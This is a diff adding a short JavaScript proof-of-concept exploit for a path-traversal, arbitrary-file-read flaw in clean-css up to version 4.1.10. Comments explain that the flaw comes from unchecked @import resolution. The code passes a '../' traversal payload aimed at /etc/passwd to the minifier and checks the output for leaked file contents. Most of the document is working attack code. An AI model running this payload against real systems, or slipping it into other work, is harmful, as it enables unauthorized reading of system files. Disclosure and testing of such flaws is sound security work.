@@ -1,0 +1,30 @@
+```javascript
+// Exploit: Path Traversal / Arbitrary File Read in clean-css (<= 4.1.10)
+//
+// clean-css's default `inline` option is ['local'], which unconditionally
+// trusts any local @import. lib/reader/read-sources.js resolves the @import
+// URI with `path.resolve(inlinerContext.rebaseTo, uri)` and then reads it with
+// fs.readFileSync — with no check that the resolved path stays inside the
+// intended base directory. An attacker-controlled CSS string can therefore
+// use "../" traversal in an @import url() to make clean-css read and inline
+// arbitrary files from the filesystem (e.g. /etc/passwd), leaking their
+// contents into the minifier's output/warnings.
+
+const CleanCSS = require("clean-css");
+
+// Attacker-supplied "CSS" containing a traversal payload instead of a real stylesheet path.
+const maliciousCss = '@import url(../../../../../../../../etc/passwd);';
+
+new CleanCSS({ returnPromise: false }).minify(maliciousCss, function (err, output) {
+  console.log("--- clean-css minify result ---");
+  console.log("errors:", output.errors);
+  console.log("warnings (leaked file contents embedded here):");
+  console.log(output.warnings.join("\n"));
+  console.log("styles:", output.styles);
+
+  const leaked = output.warnings.join("\n");
+  if (/root:.*:0:0:/.test(leaked)) {
+    console.log("\n[+] VULNERABLE: /etc/passwd contents were read off the filesystem via CSS @import path traversal!");
+  }
+});
+```
